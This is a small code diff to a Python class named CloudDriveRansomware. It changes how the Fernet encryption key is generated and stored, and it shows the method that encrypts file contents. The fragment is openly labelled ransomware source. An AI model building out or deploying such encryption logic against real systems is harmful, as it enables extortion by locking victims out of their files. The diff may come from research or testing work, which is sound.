@@ -48,9 +48,7 @@ class CloudDriveRansomware:
             f.write(self.__key)
 
     def __generate_key(self) -> bytes:
-        key = Fernet.generate_key()
-        with open("key.key", "wb") as keyfile:
-            keyfile.write(key)
+        self.__key = Fernet.generate_key()
 
     def __encrypt_file_content(self, file_content: bytes) -> bytes:
         return Fernet(self.__key).encrypt(file_content)
